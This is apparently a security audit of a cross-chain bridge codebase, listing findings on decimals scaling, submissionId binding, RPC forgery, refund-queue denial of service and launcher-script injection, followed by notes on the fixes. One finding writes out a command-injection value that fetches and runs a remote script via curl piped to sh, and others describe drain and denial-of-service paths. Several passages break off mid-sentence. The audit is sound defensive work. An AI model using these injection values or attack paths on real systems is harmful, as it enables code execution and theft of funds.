## The theme of this round

The decimals conversion is, on its own terms, well built. The arithmetic is
exact-or-revert in both VMs, the width cap moved to the wire amount, the
mirrored structs match this time, and `forge test` gained a real 373-line
`Decimals.t.sol`. I could not find a rounding, truncation or dust-loss bug in it.

What it did not get is a **binding**. The scale an amount is denominated in is
now the single most consequential number in the protocol, and it is the only
such number that nothing attests, nothing hashes and nothing cross-checks. H-1
and H-2 below are both that same gap, seen from two ends. Three reviewers
working different directories arrived at it independently.

## HIGH

### H-1 — The Solana→EVM origin proof compares a LOCAL amount against a WIRE amount; every affected transfer is rejected as a forgery and stranded
`crates/bridge-solana/src/relayer.rs:359`. CONFIRMED — independently by two
reviewers and by hand.

The decimals commit split one field into two quantities and updated one of them:

- `crates/solana-gate/src/lib.rs:1798` — the `["sent", id]` record stores
  `amount: args.amount`, the **local** mint amount. The comment says so outright:
  *"LOCAL amount: what `refund` returns, from our record."*
- `crates/solana-gate/src/lib.rs:1806` → `:2216` — the `BRIDGE_SENT` event
  carries `amount: wire_amount` (`:1758`).
- `crates/bridge-solana/src/relayer.rs:359` — `verify_sent_record` still does
  `if record.amount != event.amount { Mismatch { field: "amount" } }`.

Whenever the SPL mint's decimals exceed the asset's bridge decimals the two
differ by `10^(local-D)`, so **no validator ever signs a Solana-source transfer
of that asset**. `crates/solana-relayer/src/source.rs:546-551` logs
`REJECTED unauthentic BRIDGE_SENT — no matching on-chain origin proof`, returns
`Ok(false)`, and the cursor advances past it (`:405-406`).

It fails closed, which is why it is stranding rather than theft — but the funds
are already locked in the vault by that point (`lib.rs:1809-1817`), and there is
no recovery path. No store row is ever written (`source.rs:495` is unreachable),
so the transfer never becomes a refund candidate (`refund.rs:294`) and
`target.rs:348` requires refund signatures that will never exist. Recovery means
hand-driving `gate-admin refund` with an out-of-band quorum.

**Dormant on mesh8 by luck.** Both live assets happen to sit at `D` equal to
their mint decimals (TST 6, WRAP 9 — `config/deployments/testnet-mesh8.json`),
so the scale factor is 1. It arms the instant `D` drops below a Solana mint's
decimals, which `scripts/deploy-from-json.sh:326-358` does **automatically**
whenever any EVM leg has fewer decimals than the mint.

**Test-locked.** The mirror's own fixture builds `record.amount = event.amount`
(`relayer.rs:713`), and `solana-gate`'s account-level test correctly asserts
`record.amount == local` while the event carries wire
(`tests/account_level.rs:1993-1996`). Both halves are pinned; the contradiction
between them is what nothing checks. The anti-drift harness compares *layouts*
only and cannot catch a semantic divergence.

**Fix.** Add the wire amount to `SentRecord` so the record is self-describing and
compare like for like, or pass the asset's `bridge_unit` into `verify_sent_record`
and check `record.amount == event.amount * unit`. Regression test at
`local_decimals = 9, D = 6`.

### H-2 — Bridge decimals are not bound into the submissionId: a one-digit mis-registration on any gate mis-scales every claim by a power of ten, permissionlessly, and cannot be corrected
`contracts/src/BridgeHash.sol:59-70`, `contracts/src/Gate.sol:815,907,697-709`.
CONFIRMED.

The submissionId preimage is `prefix | bridgeDomain | debridgeId | chainIdFrom |
chainIdTo | amount | receiver | nonce`. The scale `amount` is denominated in
appears nowhere in it. The source converts down with **its own**
`bridgeDecimalsOf[token]` (`Gate.sol:815`); the destination converts back up with
**its own** (`Gate.sol:907`). The two agreeing is a pure off-chain convention.

Concretely: Sepolia registers `setBridgeDecimals(TST_SEP, 6)` on an 18-decimal
token (unit 1e12). The Monad operator fat-fingers `setBridgeDecimals(TST_MONAD, 3)`
(unit 1e15). A user sends 1 TST: `wireAmount = 1e6`, validators honestly attest it,
`claim` on Monad pays `1e6 * 1e15` = **1000 TST**. Any user, permissionlessly,
drains the Monad pot in a handful of ordinary transfers. The reverse typo silently
under-pays and strands the difference forever.

Nothing on-chain detects or undoes it. `setBridgeDecimals` is write-once
(`Gate.sol:699`) with no corrective setter; `setLocalToken` is write-once too. The
only remedies are a UUPS upgrade or a new mesh generation — which
`scripts/deploy-from-json.sh:427` already tells you (*"it is write-once; deploy a
new gate"*).

The attestation core cannot help, because it cannot see the value:
`grep -rn 'bridge_decimals' crates/validator crates/sig-store crates/bridge-core
crates/bridge-db` returns **nothing**. `abi.rs` has no `bridgeDecimalsOf` binding,
and `AllowedToken` (`allow.rs:31-40`) has no decimals column, so the allowlist
cannot express the constraint either. Round 4's *"validator signs only what it
recomputed itself"* now overstates the guarantee: **the id no longer determines
the payout.**

Contrast `bridgeDomain`, where `Gate.sol:84-93` argues at length that a mesh-wide
constant must fail *loudly* on mismatch. Bridge decimals are the same kind of
constant and got the opposite treatment.

The same gap exists on Solana and is worse there, because registration has no
timelock at all — see H-5(a).

**Fix.** Fold the asset's bridge decimals into the submissionId preimage (in
`BridgeHash.packedSubmission` and the Solana `submission_id`). A mismatched gate
then computes a different id and nothing bridges at all — the loud failure.
Cheaper partial fix: emit `bridgeDecimals` in `Sent` and have validators refuse to
attest when the source `D` differs from the destination gate's registered `D`.

### H-4 — One RPC endpoint forges `Sent` for the entire validator set; recomputing the id proves nothing
`crates/validator/src/provider.rs:52-74,112-140,185-206`,
`crates/validator/src/main.rs:173-186,251-277,408-466`. CONFIRMED (code path);
exploitation requires RPC compromise.

`handle_log` decodes `Gate::Sent`, recomputes the submissionId **from the event's
own fields**, and signs when they match. That proves the log is internally
consistent, not that it happened. Everything that could make it authentic comes
from the same endpoint: `Failover::with_failover` rotates only on `Err` (a lying
endpoint answers `Ok`, so `active` never moves off index 0), `probe` validates only
`eth_chainId`, `bridge_domain` is read once through the same provider, and the
confirmation depth is that endpoint's own `eth_blockNumber`.

`scripts/bridge-from-json.sh:281-284` writes the identical `rpcs` list, in the same
order, into every validator TOML. Compromise `rpcs[0]` and serve all validators one
fabricated log with a correct sequential nonce and a correctly-computed id: every
check passes, quorum forms, the keeper claims, and the destination gate pays out
funds that were never locked. Threshold-of-N collapsed to one endpoint.

The refund loop already does the stronger thing — `refund.rs:151-155` reads
`sentBy(id)` on-chain. The transfer path does not.

**Fix.** Require agreement before signing: read `get_logs` from ≥2 independent
endpoints and refuse a log only one returns, or confirm each candidate with
`sentBy(id) != 0` at the confirmed block on a second endpoint. Give each validator
a different endpoint ordering, and rotate off an endpoint that *disagrees*, not
only one that errors.

### H-5 — `RegisterAsset` on Solana is instant and unilateral, and binds neither the vault nor the decimals
`crates/solana-gate/src/lib.rs:2022-2135`. CONFIRMED.

Solana got a governance timelock this round for `SetValidator`/`SetThreshold`
(`lib.rs:1266-1342`) — on exactly the argument that applies here — but
`process_register_asset` remains `onlyOwner` and instant, with no `seal()`
analogue. Two drains from one instruction:

**(a) decimals mismatch, no EVM step, no timelock.** The program validates only
`bridge_decimals <= mint decimals` (`lib.rs:2051-2054`). TST with EVM `D = 6` and a
9-decimal mint, registered at `D = 3`: a *legitimate user's* 1 TST send from Sepolia
emits wire `1_000_000`, and `process_claim` pays
`1_000_000 * 10^(9-3)` = **1000 TST** (`lib.rs:1894` → `:515-517`). Repeat until the
vault is empty. Max amplification 10^9. This is H-2 with the timelock removed.

**(b) a second `debridgeId` on an already-funded vault.** Nothing requires a vault
to be unused. `asset_write_allowed` (`lib.rs:647-665`) blocks *re-pointing* an
existing id but not registering a new one — the same gap round 4's H-1 found on
`setLocalToken`. The owner binds a fresh `debridge_id` to the live mint and vault,
produces a source-side `Sent` for it, and claims the real vault.

**Fix.** Mirror the EVM `seal()` + `_consumeGovernance` in `process_register_asset`
— the machinery exists and is tested. Refuse a vault already named by another asset
record (or derive it as a per-`debridge_id` PDA). Have `deploy-from-json.sh` read
back `AssetConfig.bridge_decimals` and compare it against every EVM gate's
`bridgeDecimalsOf` before declaring a deploy healthy.

### H-6 — One `Sign`-scoped credential permanently kills the fleet's refund path
`crates/sig-store/src/main.rs:535-539`, `crates/bridge-db/src/lib.rs:1237-1268`,
`crates/validator/src/refund.rs:309-392`. CONFIRMED.

`GET /refund-candidates` takes **no `limit`/`offset`** and `Db::refund_candidates()`
is an unbounded `SELECT` — round 4's paging fix covered `/submissions` and
`/history` and missed this route. `sweep_refund_eligible` flips *every* aged row to
`'eligible'` with no requirement that it describe a deliverable transfer.
`handle_candidate` does all 8-30 on-chain reads *before* `decide`, per candidate,
per tick, forever. And `RemoteStore` caps responses at 8 MiB — past that,
`refund_candidates()` returns `TooLarge` every tick and the loop logs and retries
**forever** (`refund.rs:312-316`).

Every validator container is handed the *same* `SIG_STORE_VALIDATOR_TOKEN`
(`docker-compose.yml:86,106,121,136`), so compromising one validator yields the
fleet's Sign credential. At ~600 bytes/record the payload crosses 8 MiB after
~14,000 rows — **under five minutes** at the 50/s limit. Once the sweep ages them
in, every validator's refund loop is dead permanently, real stuck transfers can
never be cancelled or refunded again, and there is no delete path to clean up
without manual DB surgery.

**Fix.** Page `/refund-candidates` and walk pages. Cheap-skip before the RPC reads
(check `mine(...)` first). Bound `sweep_refund_eligible` by signature count and an
age ceiling. Cap the text fields so a junk row cannot be 250 KB.

### H-7 — The public API's rate limiter is bypassable, and its complexity caps cover three fields out of ten
`crates/graphql-api/src/main.rs:275-289`, `crates/bridge-core/src/ratelimit.rs:135-143`,
`crates/graphql-api/src/schema.rs:608-894`. CONFIRMED.

**The limiter keys on an unvalidated client-supplied bearer token.** That is sound
in the sig-store, where `require_scope` layers *outside* it so only real
credentials reach a bucket. `graphql-api` mounts **no authentication at all** — so
the bucket key is chosen by the attacker. A fresh random bearer per request lands
on a brand-new bucket initialised to full burst: the advertised 25 req/s is
**zero**. The in-code comment ("shared otherwise — this service is usually
unauthenticated and public, so the shared bucket is the common case") assumes
exactly what an attacker declines to do. It is self-amplifying, too: `SWEEP_AT`
runs an O(n) `retain` under the mutex on every request past 4,096 entries, and
sweeps only buckets that have refilled to *full*, so the map grows without bound.

**The complexity caps miss seven of the ten upstream-touching root fields.** Only
`submissions`, `history` and `swapHistory` are annotated; `stats`, `pools`,
`swapQuote`, `solanaBlockhash`, `solanaTokenBalance`, `solanaSignatureStatus` and
`solanaGateContext` all cost **1**. Worse, the list multiplier *replaces* the
field's own cost, so `submissions(limit:1){nonce}` scores 1 while the resolver
still calls `load_all()` for the store's 5,000-row default page.

Measured against a real `async-graphql` 7 schema with this service's limits, ~4,000
aliases fit one 128 KiB body, and root fields resolve **concurrently** — so one
anonymous POST becomes ~4,000 simultaneous upstream calls. Point it at `pools` and
it is ~24,000 `eth_call`s against the keyed RPC every validator shares (H-3).
The sig-store's read router is deliberately un-rate-limited, so nothing throttles
the amplified load on Postgres either.

**Fix.** Key the limiter on the peer address (`ConnectInfo<SocketAddr>`) or a
trusted forwarded hop, keeping the token key only where a scope check has already
validated it; bound the bucket map and sweep by age. Give every upstream-touching
field an honest cost, make the list formula additive
(`STORE_READ_COST + page_size * child`), push the window server-side via the
existing `load_page`/`history_page`, and cap concurrent upstream calls per request.

## MEDIUM

### M-1 — `seal()` is unenforced on-chain, so round-4 H-1's timelock is a runbook step
`contracts/src/Gate.sol:680,705,739`; `contracts/script/DeployProd.s.sol:133-144`.
CONFIRMED. `isSealed` is consulted at exactly three lines and by **no fund-moving
function** — `claim` releases liquidity from an unsealed gate exactly as from a
sealed one. `DeployProd` asserts seven post-deploy invariants and not this one; it
only *logs* it (`:96`), after handing ownership to the multisig (`:130`) so `seal()`
must now come from the multisig several manual steps later, at the moment liquidity
is provisioned. Forget it, and round-4 H-1 is verbatim open in one block. The
contract's own header says it: *"An unsealed gate that holds funds is that drain
waiting"* (`Gate.sol:37`). **Fix:** refuse `claim` while `!isSealed`, making it an
invariant rather than a procedure; add the assertion to `DeployProd`.

### M-2 — The decimals change is not upgrade-compatible, on a contract documented as upgrade-in-place
`contracts/src/Gate.sol:45-62,812,907,1034`. CONFIRMED. Storage layout is fine
(verified `isSealed`@15, `supportedChain`@16, `bridgeDecimalsOf`@17, `__gap[46]`@18-63).
The break is semantic: on the block an in-place upgrade lands, all three new
mappings read zero, so `send` reverts `UnsupportedChain`, `claim` reverts
`BridgeDecimalsUnset` — and so does **`refund`**, the one path documented as
never-halting (`Gate.sol:991-997`), so the two-phase recovery cannot rescue what the
frozen claim stranded. `isSealed` is false, so M-1 is wide open on a funded gate.
Then, once decimals are registered, every *pre-upgrade* in-flight id carries a local
amount in its `amount` field and `claim` pays it `* 1e12`. No `reinitializer`, no
migration, no guard. Avoided so far only because mesh8 shipped as a new generation.
**Fix:** a `reinitializer(2)` that seeds all three in the same transaction as the
implementation swap, or amend the doc block to say a decimals-semantics change
requires a new generation.

### M-3 — `AssetConfig` grew past its allocated account: an in-place Solana upgrade bricks every legacy asset
CONFIRMED by arithmetic on both layouts. At `616ef28` the account was allocated
`1 + 32 + 32 + 32` = **97** bytes for a 96-byte body; today `ASSET_CONFIG_LEN =
32*3 + 2` = **98** (`lib.rs:490`, alloc at `:2094`). One byte over. `load_asset`
hits `UnexpectedEof` → `InvalidAccountData`, so `send`, `claim` **and `refund`** all
fail permanently for every legacy-registered asset — vault funds unreachable.
`register_asset` cannot repair it (the non-empty branch hits the same deserialize at
`:2125`), and there is no `realloc` anywhere in either crate. `SentRecord` got an
explicit legacy decode path with a test (`lib.rs:584-597`); `AssetConfig` got
neither, and now has **zero** remaining slack, so the next field repeats this.
Not live — mesh8 deployed a fresh program — but `deploy-from-json.sh:735-737`
explicitly supports re-running against an existing one. **Fix:** allocate with slack
and add a legacy decode path (a 96/97-byte body decoding to `0/0` yields `unit = 1`,
which is exactly the correct legacy semantics). Borsh's `deserialize` ignores
trailing bytes, so over-allocating is safe.

### M-4 — Round-4 M-1's "pre-poison a future submissionId" primitive survives under the Indexer scope
`crates/sig-store/src/main.rs:555-563` → `crates/bridge-db/src/lib.rs:840-877`.
CONFIRMED. The Relay half is genuinely fixed (`post_claimed` → `note_keeper_claim`,
first-write-wins, parks nothing). But `POST /submissions/:id/observed/claimed` still
calls the full authoritative `mark_claimed`, `park_if_missing` and all, and parking
validates only the id's *shape*. submissionIds are deterministic and nonces
sequential, so future ids are computable. Compromise the Solana relayer container
(the only holder of `SIG_STORE_INDEXER_TOKEN`), POST a batch of upcoming ids, and
when those transfers happen the parked marker lands the instant the `Sent` row is
inserted — `status='claimed'` hides them from `pending_claims`,
`sweep_refund_eligible` **and** `refund_candidates`, permanently, with nothing that
writes `status` back. The project's own test asserts the primitive works
(`main.rs:1224-1239`). **Fix:** reject an unknown id on the HTTP `/observed/*`
routes; the EVM indexer writes to Postgres directly and can keep parking.

### M-5 — The allowlist kill-switch fails **open** on an empty response from the untrusted store
`crates/bridge-core/src/allow.rs:222-231`, `crates/validator/src/main.rs:308-315`.
CONFIRMED. Semantics are opt-in: an empty list allows everything. The validator's
fail-closed path triggers only on a fetch **error** — a `200 OK` with `[]` is not an
error. An attacker controlling the sig-store (explicit threat model (b)) answers
`[]` and the one content-level control standing between a malicious corridor and
validator signatures is silently off at every validator and the keeper
simultaneously. `bridge_db::remove_allowed_token` correctly refuses to empty the
table — but that guard is on the side of the boundary the design says not to trust.
**Fix:** pin a local minimum in validator config and intersect; distinguish
`NotConfigured` from `Empty` and refuse to sign on `Empty`.

### M-6 — The keeper never recomputes the submissionId, so a domain rotation becomes a permanent per-tick revert loop
`crates/keeper/src/main.rs:696-768`; `grep -n bridge_domain` → **no hits**.
CONFIRMED. `member_signatures` authenticates every signature *over `rec.submission_id`*
and takes the eight params that become calldata on trust. Not fund loss — the Gate
is the backstop — but the trigger is in the operations playbook: rotate
`BRIDGE_DOMAIN` (mandated after round-4 H-3) and every unclaimed pre-rotation row
still carries the old domain. All the keeper's checks pass, `estimateGas` reverts
`NotEnoughSignatures`, and the tick logs `"claim failed"` — forever, at 1 s, with a
message naming no cause. The `StrandedLog` "say it once" machinery covers only the
two `Ok(Stranded)` reasons, not an `Err`, so this is exactly the WARN flood it was
built to prevent. **Fix:** read `bridgeDomain()` once in `connect_gate` and compare a
locally recomputed id against `rec.submission_id` before submitting; a mismatch is a
new `Stranded` reason, reported once.

### M-7 — Indexer advances its cursor on an empty `get_logs` from a lagging node
`crates/indexer/src/main.rs:149-219,238-268`. PLAUSIBLE. `cached_latest` and the log
windows are two independent round trips to what, behind any hosted provider, is a
*pool* of nodes at differing heights. A `get_logs` served by a node that has not yet
imported the range returns `Ok(vec![])`, `all_ok` stays true, and the cursor moves
past blocks never read. Nothing revisits them. A `Sent` in that window is never
mirrored, so the transfer never appears in history, never gets a `refund_status`
row, and `sweep_refund_eligible` can never flag it. `block_confirmation` defends
against reorgs, not against a peer being behind. **Fix:** confirm the range was
actually served (`eth_getBlockByNumber(to_block)`, or the response's highest block),
or re-read a non-trivially-empty window once before advancing.

### M-8 — Config data crosses into code in the launcher scripts
CONFIRMED, three distinct sinks:
- **`bash -c` on config-derived strings** — `scripts/bridge-from-json.sh:854`
  `setsid bash -c "exec $1"`, with call sites building `$1` from `.sig_store.bind`
  (`:937`), `.graphql.bind` (`:1010`) and `.frontend.host/.port` (`:1038`). A bind of
  `127.0.0.1:8080; curl http://x/p|sh` executes as the operator. `bridge.config.json`
  is presented as pure data and is partially rewritten by `deploy-from-json.sh:1031`.
- **SQL + world-readable argv** — `bridge-from-json.sh:898-899` and `run.sh:612-613`
  interpolate `PG_PASSWORD` into `ALTER USER … PASSWORD '$PG_PASSWORD'` (a `'`
  escalates to `SUPERUSER`) and put the plaintext on a command line, which this very
  file elsewhere calls out as world-readable in `/proc` (`:936`).
- **jq filter and path injection** — `bridge-from-json.sh:277,341,380,748` and
  ~13 sites in `deploy-from-json.sh` splice names/symbols into filter strings; `:559`
  splices a symbol into a jq *path*. The same unvalidated values build file paths
  (`:278` `validator-$vname.toml`, `:240` `docker/$NAME`), so a name of
  `../../../..` writes a private-key-bearing TOML outside the tree.

**Fix:** `spawn` takes argv, not a string; statements on stdin; `jq --arg`
everywhere; validate names/symbols against `^[A-Za-z0-9_-]{1,64}$` and binds against
a host:port pattern.

### M-10 — The frontend applies the u64 cap to the local amount, refusing every Solana-bound send above ~18.45 tokens
`frontend/src/wallet/eth.ts:119` vs `frontend/src/components/BridgeView.tsx:331`.
CONFIRMED. The encoder checks `amount > U64_MAX` where `amount` is `amountBase`
(local); `BridgeView` correctly divides by `bridgeUnit` first, and `Gate.send` caps
the **wire** amount (`Gate.sol:815,826`). On mesh8 TST is 18 local / 6 bridge, so
`bridgeUnit = 1e12` and anything over **18.446744073709551615 TST** throws — nine

### H-1 — the local/wire amount comparison
`crates/bridge-solana/src/relayer.rs`, `crates/solana-relayer/src/source.rs`.

`verify_sent_record` now takes the asset's `bridge_unit` and compares
`record.amount == event.amount * unit`, with a `checked_mul` whose overflow is a
mismatch (a genuine record cannot overflow: the program derived the wire amount
by dividing a u64 by that same unit). A zero unit is refused outright.

The scale is read from the gate's own `["asset", debridgeId]` account by a new
`Scanner::bridge_unit_for`, which keeps the existing split of failure modes: an
RPC fault propagates (the cursor stays put and the tick retries) while an absent,
foreign-owned or undecodable registration is "not ours" and skips — a genuine
`send` cannot produce one, since `process_send` loads that very account.

Chosen over adding the wire amount to `SentRecord`, which would have changed an
on-chain account layout and repeated M-3's mistake. This is off-chain only: no
program redeploy.

Four tests, including the codebase's own documented case (a 9-decimal mint at 6):
`a_decimals_normalised_record_corroborates_its_event` (fails before the fix),
`the_wrong_bridge_unit_does_not_corroborate` (the check still binds the amount —

`a_zero_bridge_unit_is_refused`. The old fixture, which built
`record.amount = event.amount` and so could never catch this, is now parameterised

### H-6 — the refund queue is paged, and re-attested candidates cost nothing
`bridge-db`, `sig-store`, `bridge-core` (`remote.rs`, `backend.rs`),
`validator/refund.rs`, `solana-relayer` (`store.rs`, `refund.rs`).

`GET /refund-candidates` now takes `limit`/`offset` through the same clamped
`page()` helper as `/submissions` and `/history`, and the SQL's `ORDER BY` is made
total with `submission_id` so a walk cannot skip or repeat a row when timestamps
collide. Both refund loops walk pages (`REFUND_PAGE = 500`, at most
`MAX_REFUND_PAGES = 20` per tick, a short page ends the walk) instead of

cap into a permanent fleet-wide stall.

asserts exactly that across all 32 combinations of chain facts, so a future branch

The filter uses the store's labels, like `decide`'s own inputs: it is a cost

## Fix applied 2026-09-16 — H-2, the bridge-decimals cross-check

The maintainer chose the **non-breaking cross-check** over folding the scale into
the submissionId. The wire format, the submissionId preimage and every signing
domain are therefore unchanged: no new mesh generation, and in-flight transfers
stay valid.

### Where the check had to go

`Gate.claim` is `external` with no access control, and the collected signatures
are public (the GraphQL API serves the raw 65 bytes so a user can self-claim). So
once a quorum exists, **anyone** can complete the transfer — a check in the keeper
would only ever bind the keeper. The signature is the last thing that can be
withheld, which makes the *signers* the only component that can actually prevent
the payout. All three signing paths now refuse:

| direction | signer | source scale from | destination scale from |
|---|---|---|---|
| EVM → EVM | validator | source gate `bridgeDecimalsOf(token)` | destination gate `bridgeDecimalsFor(debridgeId)` |
| EVM → Solana | validator | same | the Solana gate's `["asset", debridgeId]` account (added after live testing — see below) |
| Solana → EVM | solana-relayer scanner | the gate's own `["asset", id]` account | destination gate `bridgeDecimalsFor(debridgeId)` |

### Contract — `contracts/src/Gate.sol`

New view, additive and non-breaking:

    function bridgeDecimalsFor(bytes32 debridgeId)
        external view
        returns (bool set, uint8 bridgeDecimals, uint8 localDecimals, address localToken)

Off-chain holds a `debridgeId`, not the destination's local token, so checking the
far end previously took `tokenOf` then `bridgeDecimalsOf` with a race between
them. This answers it atomically. It **never reverts**: an unregistered corridor
is `set == false`, so a caller can tell "no corridor" from "corridor at scale 0" —
which matters, because those two must not compare equal.

Note it is deliberately *not* used for the source side: a gate never maps its own
outgoing `debridgeId`, so `bridgeDecimalsFor` on the source would answer
"unregistered". The source is read by token.

Three tests (`contracts/test/Decimals.t.sol`), `forge test` 215 → **218**:
resolution through the corridor, the no-revert-on-unknown property, and
`test_AMisregisteredDestinationOverpaysByAPowerOfTen` — a PoC in which an
operator types `3` instead of `6`, an ordinary user sends exactly 1 TST, and
**1,000 TST** leaves the vault. Each gate behaves exactly as configured; only the
disagreement is wrong, and neither end can see the other. That test also asserts
the two `bridgeDecimalsFor` answers differ, which is the signal the off-chain
refusal is built on.

### Backend — validator (EVM legs)

New `crates/validator/src/scale.rs`. Before signing, `handle_log` compares the two
ends and withholds on `Mismatch` **or** `Unknown`, consuming the nonce either way
so the sequence stays intact (the same posture as the allowlist block — the
transfer really did happen). Successful reads are cached forever, since both
registrations are write-once, so steady-state cost is one pair of `eth_call`s per
corridor rather than per transfer; failures are never cached, or one RPC fault
would become a permanent refusal. The "peer not configured" warning is emitted
once per chain, not once per transfer.

Peers come from a new top-level `[[destinations]]`, falling back to
`[[refund.destinations]]` — the same `(chain_id, gate, rpcs)` shape — so a
deployment that already attests refunds gets the check **without editing a
config**. Peer providers go through `provider::connect_checked`, which verifies
the chain id, so a wrong-chain endpoint cannot answer for a peer it is not.

`cargo test -p validator` 43 → **49**.

### Backend — solana-relayer (Solana → EVM)

The scanner signs this direction and had the same exposure. `evm::GateReader`
gained `bridge_decimals_for`, read at the **confirmed** block like every other
decision there. The ABI decode is hand-rolled (this crate deliberately links no
ABI codec), so it is extracted as `decode_bridge_decimals_for` and tested against
the shapes that matter: the right byte out of the right word, `set == false`
distinguishable from scale 0, and a short/garbage return erroring rather than
decoding — a pre-fix gate reverts, and an `eth_call` to a non-contract returns
empty; neither may read as a valid scale.

The asset account is now fetched once per event and feeds both this check and the
H-1 unit, instead of twice. Readers come from a new `[[evm_destinations]]`,
falling back to `[[refund.evm]]`.

`cargo test` in `crates/solana-relayer` 95 → **99**.

### Frontend

`bridgeDecimalsFor(bytes32)` = `0x93b06e9d` and `tokenOf(bytes32)` = `0xbae667bc`
(both independently re-derived with `cast sig`). A new `debridgeId()` mirrors
`BridgeHash.getDebridgeId` — `keccak256(abi.encodePacked(uint256, address))`, the
token **not** word-padded — pinned against a golden `cast` vector.

The destination scale is read with the same `readFor`-style staleness stamp the
existing on-chain reads use, and the send button is disabled on mismatch, on
unknown, and while the read is in flight, so it is never enabled before the check
lands. On a mismatch the notice names both scales, the exponent, and which way it
would go wrong. A gate older than `bridgeDecimalsFor` falls back to
`tokenOf` + `bridgeUnit` + `decimals()`; if that also fails the answer is UNKNOWN
and the UI fails closed. EVM→Solana compares against `solanaGateContext.bridgeDecimals`,
which `solana_pool.rs` reads from the on-chain `AssetAccount` — so that is two
on-chain values, not registry-vs-registry.

### T-1 — HIGH, regression: no fallback for pre-upgrade gates
The validator (`crates/validator/src/scale.rs`) and the relayer
(`crates/solana-relayer/src/evm.rs`) read the destination scale only through the new

**Fixed.** Both readers fall back to `tokenOf(bytes32)` then

every decimals-aware gate has. The race the one-call form was meant to avoid cannot

### T-2 — HIGH, regression: EVM→Solana transfers were never signed

read a Solana chain; the generators list only `.chains[]` (EVM). So every
EVM→Solana transfer was refused. The earlier claim in this document that the
direction was "guarded in the UI, not in the validator" was wrong.

**Fixed** (maintainer's choice: read the Solana asset). New
`[[solana_destinations]]` (`chain_id`, `program_id`, `rpc`): the validator derives
the gate program's `["asset", debridgeId]` PDA and reads its `bridge_decimals`.
Reuses the code already serving live traffic — `swap_math::pda::find_program_address`
(parity-tested against the program's own derivation) and
`bridge_solana::account::AssetAccount`, exactly as `graphql-api` does. It requires
program ownership and a matching `debridgeId`, and refuses pre-decimals records.
Pinned by a unit test on **real devnet bytes**: the derived PDA
`GeLamBdw…` exists on devnet, owned by the gate program, 98 bytes, scale 6.
`bridge-from-json.sh` emits the block whenever `.solana.enabled`; the production
template documents it; startup validation refuses a malformed program id or a
chain listed as both EVM and Solana.

### T-3 — MEDIUM, regression: one transient RPC error withheld a signature forever
The first live replay with T-1 fixed still withheld Hoodi→Sepolia — because the
public Sepolia endpoint returned HTTP 429 during the fallback read. The guard
mapped *any* read failure to `Unknown`, which withholds the signature **and advances
past the transfer**. On a 2-of-2 mesh, one validator's rate limit therefore left a
legitimate transfer short of quorum for good, recoverable only through the refund
path. It also contradicted this codebase's own convention (`origin_proof_holds`: an
RPC fault means "we do not know — propagate, the tick retries").

**Fixed.** Transient failures (transport errors, rate limits, timeouts) now
propagate as `Err`: the batch fails, the cursor stays, nonces roll back, and the
transfer is re-examined next tick. Only definitive answers — mismatch, no corridor,
a contract revert, an unusable account — withhold and move on. Implemented in both
the validator (`is_definitive` over alloy's error, using `as_revert_data`) and the
relayer (`reverted`).

**The tradeoff, stated plainly.** Retrying happens at batch level, so a destination
RPC that is down for *hours* now holds up every transfer from that source chain
behind it (head-of-line blocking), where before only the one transfer was affected
— but lost its signature for good. Losing signatures silently is the worse failure,
and store/sign failures already behave this way. Cadence is one poll interval per
attempt (2–5 s on mesh8), i.e. ~40–60 extra `eth_call`s a minute per stuck
destination. **Operate destination RPCs with the same care as source RPCs.** A
bounded in-call retry that absorbs short blips before failing the batch would
narrow the window further; not done here.

### L-live-2 — HIGH-adjacent, found live: every node logged the provider key in the clear

`reqwest`'s transport errors carry the URL they failed on, and the nodes log those
errors verbatim. Three days of mesh9 logs held **47** occurrences of the keyed
Alchemy endpoint across **five** services (validator ×2, keeper, both relayers,
solana-price-keeper) — in `docker logs`, and in anything shipping them:

```text
WARN validator: get_logs failed; retrying chain_id=11155111
     error=… error sending request for url (https://eth-sepolia.g.alchemy.com/v2/alch_…)
```

The round-5 LOW fix redacted the `--gate`/`--swap` *parse* errors (`redact_spec`),
which is a different path: this one is built several layers below the call site, so
no per-`warn!` discipline can hold it. H-3 already treats this key as exposed, but
the mechanism outlives the rotation.

**Fixed** at the single place every line passes through. New crate
`crates/log-scrub` (tiny and dependency-light *because* `solana-relayer` cannot
depend on `bridge-core` — see [[solana-relayer-mirrored-structs]] for what
duplicating it instead would cost):
- a `MakeWriter` that scrubs whole lines, line-buffered so a URL split across two
  writes is still caught;
- inside a URL only, an opaque path segment or query value becomes `<redacted>`
  (≥16 chars of `[A-Za-z0-9_-]`, needing a digit and either an uppercase letter or
  4+ digits, `0x…` exempt). Scheme, host and port always survive, so the line still
  names the failing endpoint;
- `register_secret` for values with no recognisable syntax — both store clients now
  register their bearer token;
- `log_scrub::init(filter)` replaces the eight hand-rolled `tracing_subscriber::fmt()`
  blocks, so a new binary cannot forget;
- `gate-admin` / `swap-admin` print through it too (their `Error:` line bypasses any
  subscriber).

Proof: the same price-keeper run against an unresolvable keyed endpoint leaked the
key **3×** on `ef92fd3` and **0×** now. All 2,570 live mesh9 log lines piped through
`cargo run -p log-scrub --example scrub-stdin`: 47 keyed URLs → 0, exactly 47 lines
changed, and all 244 submissionIds and 43 base58 pubkeys survive byte-for-byte.
That example is also the filter for logs already captured.

*Not covered:* a credential a `Debug` impl has mangled, and anything written to
stderr by a panic. `--rpc-env` remains the right way to keep keys off argv.
